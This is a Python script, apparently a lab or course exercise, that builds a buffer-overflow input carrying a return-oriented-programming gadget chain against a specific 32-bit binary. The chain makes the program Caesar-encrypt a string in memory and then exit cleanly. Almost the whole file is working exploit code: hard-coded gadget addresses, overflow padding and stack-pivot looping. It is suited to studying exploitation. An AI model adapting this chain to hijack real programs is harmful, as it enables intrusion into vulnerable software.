################################################ USER INPUT #################################################
# NOTE: User must enter key and input text here
key  = 23
text = "ABCDEFGHIJKLMNOPQWER"


############################################# HELPER FUNCTION ###############################################
import struct

def getHex(n):
    return struct.pack('<I', n)

############################################ IMPORTANT ADDRESSES ############################################
padding    = '\x00\x50\x0e\x08'

main_ret    ='\xba\x9e\x04\x08' # '0x08049eb7'
exit_address='\xf0\x07\x05\x08' # '0x080507f0'
safe_address='\x00\x50\x0e\x08\x08\xd0\xff\xff'

glb_addr  = '\xc0\x6c\x0e\x08' # '0x080e6cc0' # len
temp_var1 = '\xc4\x6c\x0e\x08' # '0x080e6cc4'
temp_var2 = '\xc8\x6c\x0e\x08' # '0x080e6cc8'
temp_var3 = '\xd4\x6c\x0e\x08'
temp_var4 = '\xd8\x6c\x0e\x08'
plain_text= '\xe0\x6c\x0e\x08' # '0x080e6ce0'
ebx_old_vl= '\x00\x50\x0e\x08' # '0x080e5000'

############################################ IMPORTANT CONSTANTS ############################################
offset    = '\x08\xff\xff\xff' # 62x4 dec -> 3ex4 hex (Take 2's Complement)
A_char 	  = '\x41\x00\x00\x00' # '0x00000041'
dummy 	  = 'AAAA'

key_val_hex  = getHex(key)
len_val_hex  = getHex(len(text)-1)
mod_val_hex  = getHex(26) 		   # '\x1A\x00\x00\x00' # '0x0000001a'
zero_constant= getHex(0) 		   # '\x00\x00\x00\x00' # '0x00000000'
one_constant = getHex(1)		   # '\x01\x00\x00\x00' # '0x00000001'

################################################## GADGETS ##################################################

# '0x08070b64' : add eax, ecx ; ret
add_eax_ecx = '\x64\x0b\x07\x08'

# '0x08071393' : add eax, edx ; ret
add_eax_edx = '\x93\x13\x07\x08'

# '0x08071385' : adc al, dh ; ret
adc_al_dh = '\x85\x13\x07\x08'

# '0x0809c3c1' : add esp, dword ptr [ebx + eax*4] ; ret
add_esp_dw = '\xc1\xc3\x09\x08'

# '0x0805f980' : sub eax, edx ; ret
sub_eax_edx = '\x80\xf9\x05\x08'

# '0x0808a9c5' : div esi ; add ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; ret
div_esi = '\xc5\xa9\x08\x08'


# '0x08098db0' : mov eax, ecx ; ret
mov_eax_ecx = '\xb0\x8d\x09\x08'

# '0x08098db8' : mov ecx, eax ; mov eax, ecx ; ret
mov_ecx_eax = '\xb8\x8d\x09\x08'

# '0x0806dac2' : mov byte ptr [edx], al ; mov eax, edx ; ret
mov_bptr_edx_al = '\xc2\xda\x06\x08'

# '0x08088b4d' : mov dword ptr [ecx], eax ; pop ebx ; ret
mov_dw_ecx = '\x4d\x8b\x08\x08'

# '0x0805fc44' : mov eax, dword ptr [eax] ; ret
mov_eax_dw_eax = '\x44\xfc\x05\x08'

# '0x0805fde2' : movzx eax, byte ptr [edx] ; pop ebx ; pop esi ; ret
movzx_eax = '\xe2\xfd\x05\x08'


# '0x080b054a' : pop eax ; ret
pop_eax = '\x4a\x05\x0b\x08'

# '0x08049022' : pop ebx ; ret
pop_ebx = '\x22\x90\x04\x08'

# 0x08049859 : pop ebp ; ret
pop_ebp = '\x59\x98\x04\x08'

# '0x080640c1' : pop ecx ; add al, 0xf6 ; ret
pop_ecx = '\xc1\x40\x06\x08'

# '0x0804af5a' : pop esi ; ret
pop_esi = '\x5a\xaf\x04\x08'

# '0x0805ebf9' : pop edx ; pop ebx ; ret
pop_edx_ebx = '\xf9\xeb\x05\x08'


# '0x08074696' : xchg edx, eax ; ret
xchg_edx_eax = '\x96\x46\x07\x08'


############################################### GADGETS CHAIN ###############################################

# INITIALIZATION
gadget_chain  = pop_ecx + glb_addr  + pop_eax + len_val_hex   + mov_dw_ecx + ebx_old_vl
gadget_chain += pop_ecx + temp_var1 + pop_eax + offset 		  + mov_dw_ecx + ebx_old_vl
gadget_chain += pop_ecx + temp_var2 + pop_eax + zero_constant + mov_dw_ecx + ebx_old_vl


# ENCRYPT 1 CHARACTER
gadget_chain += pop_eax + glb_addr + mov_eax_dw_eax + pop_edx_ebx + plain_text + ebx_old_vl + add_eax_edx + xchg_edx_eax # 8
gadget_chain += pop_ecx + zero_constant + movzx_eax + ebx_old_vl + dummy # 5
gadget_chain += mov_ecx_eax + pop_eax + key_val_hex + add_eax_ecx # 4
gadget_chain += pop_edx_ebx + A_char + ebx_old_vl # 3
gadget_chain += sub_eax_edx + pop_esi + mod_val_hex + pop_edx_ebx + zero_constant + zero_constant + div_esi + ebx_old_vl + dummy # 9
gadget_chain += pop_eax + A_char + add_eax_edx + mov_ecx_eax # 4
gadget_chain += pop_eax + glb_addr + mov_eax_dw_eax + pop_edx_ebx + plain_text + ebx_old_vl + add_eax_edx + xchg_edx_eax # 8
gadget_chain += mov_eax_ecx + mov_bptr_edx_al # 2


# JUMP BACK TO START LOCATION
gadget_chain += pop_eax + glb_addr + mov_ecx_eax + mov_eax_dw_eax + pop_edx_ebx + one_constant + ebx_old_vl+ sub_eax_edx # 8
gadget_chain += mov_dw_ecx + ebx_old_vl + pop_edx_ebx + zero_constant + ebx_old_vl + pop_eax + zero_constant # 7
gadget_chain += adc_al_dh + pop_ebx + temp_var1 + add_esp_dw # 4

# offset value : 8+5+4+3+9+4+8+2+8+7+4 = 62 = 62*4B = 248B

# LOOP EXITED NORMAL FLOW
gadget_chain += pop_ebx + ebx_old_vl
gadget_chain += pop_ecx + glb_addr + pop_eax + zero_constant + mov_dw_ecx + ebx_old_vl ## resets glb to 0

############################################# SAFE EXIT PART ##############################################
gadget_chain += pop_ecx + temp_var3 + pop_eax + exit_address + mov_dw_ecx + ebx_old_vl
gadget_chain += pop_ecx + temp_var4 + pop_eax + temp_var4 + mov_dw_ecx + ebx_old_vl
gadget_chain += pop_ebp + plain_text

gadget_chain += main_ret


############################################## BUFFER OVERFLOW ##############################################

# this function takes each hexa address byte by byte and overflow fgets for first byte and makes the loop infinite and atlast makes the incrementor value 9, so it will stop the loop
def changeFormat(s):
	ans=""
	l=len(s)
	for i in range(0,l-1,1):
		ans+=s[i:i+1]+"B"*11+"\x01\n"
	ans+=s[l-1:l]+"B"*11+"\x09\x00\x00\x00"
	return ans

overflow_till_ebp=text+"\n"+("A"*12+"\x01\n")*16

exploit_string=overflow_till_ebp+changeFormat(safe_address+gadget_chain)

############################################## EXPLOIT STRING ###############################################

print(exploit_string)
